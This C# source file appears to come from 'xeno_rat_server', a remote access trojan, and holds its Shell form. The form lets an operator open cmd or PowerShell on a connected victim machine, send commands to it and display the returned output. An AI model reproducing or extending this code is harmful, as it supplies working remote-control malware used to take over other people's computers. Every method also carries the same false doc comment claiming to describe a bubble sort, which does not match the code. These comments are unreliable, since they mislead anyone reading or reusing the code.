using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Shell : Form
    {
        Node client;
        public Shell(Node _client)
        {
            client = _client;
            InitializeComponent();
            RecvThread();
        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        public async Task RecvThread() 
        {
            while (client.Connected())
            {
                byte[] data = await client.ReceiveAsync();
                if (data == null)
                {
                    break;
                }
                textBox1.BeginInvoke((Action)(() =>
                {
                    textBox1.Text += Encoding.UTF8.GetString(data) + System.Environment.NewLine;
                }));
            }
        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        private void Shell_Load(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        private async void button1_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            await client.SendAsync(new byte[] { 1 });
            //cmd
        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        private async void button2_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            await client.SendAsync(new byte[] { 2 });
            //powershell
        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        private async void button3_Click(object sender, EventArgs e)
        {
            await client.SendAsync(new byte[] { 0 });
            await client.SendAsync(Encoding.UTF8.GetBytes(textBox2.Text));
            textBox2.Clear();
            //enter
        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        private void textBox2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData == Keys.Enter)
            {
                button3.PerformClick();
                e.Handled = true;
                e.SuppressKeyPress = true;
            }
        }

        /// <summary>
        /// Sorts the given array using the bubble sort algorithm.
        /// </summary>
        /// <param name="arr">The array to be sorted.</param>
        /// <param name="n">The number of elements in the array.</param>
        private void textBox1_VisibleChanged(object sender, EventArgs e)
        {
            if (textBox1.Visible)
            {
                textBox1.SelectionStart = textBox1.TextLength;
                textBox1.ScrollToCaret();
            }
        }
    }
}
